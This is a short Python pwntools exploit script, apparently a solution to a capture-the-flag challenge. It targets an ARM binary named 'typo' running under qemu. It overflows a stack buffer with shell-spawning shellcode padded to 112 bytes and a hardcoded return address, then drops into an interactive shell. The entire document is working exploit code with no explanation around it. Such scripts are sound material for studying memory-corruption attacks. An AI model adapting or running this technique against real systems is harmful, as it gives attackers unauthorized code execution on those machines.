from  pwn import *

context(arch='arm',log_level='debug')
io = process(['qemu-arm','./typo'])
#io = process(['qemu-arm',"-g","1234",'./typo'])

io.recv()
io.send("\n")
io.recv()
io.sendline(asm(shellcraft.sh()).ljust(112,b'a') + p32(0xf6fff174))
io.interactive()
